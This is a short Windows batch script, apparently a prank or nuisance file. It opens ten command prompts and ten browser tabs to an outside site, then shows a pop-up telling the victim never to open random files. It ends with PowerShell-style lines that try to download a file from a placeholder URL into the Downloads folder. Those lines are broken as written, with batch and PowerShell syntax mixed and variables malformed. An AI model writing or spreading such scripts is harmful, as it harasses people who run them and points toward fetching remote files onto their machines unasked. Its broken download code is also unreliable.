FOR /L %%A IN (1,1,10) DO (
    start cmd.exe
    start https://nano-ck.cf
)
SET msgboxTitle=Hey, I'm NANO
SET msgboxBody=You just had the proof that you can't trust anyone! Never open random files
SET tmpmsgbox=%temp%\~tmpmsgbox.vbs
IF EXIST "%tmpmsgbox%" DEL /F /Q "%tmpmsgbox%"
ECHO msgbox "%msgboxBody%",0,"%msgboxTitle%">"%tmpmsgbox%"
WSCRIPT "%tmpmsgbox%"
webclient = New-Object System.Net.WebClient
url = "links"
file = "C:\Downloads\README.txt"
webclient.DownloadFile(url,file)
pause
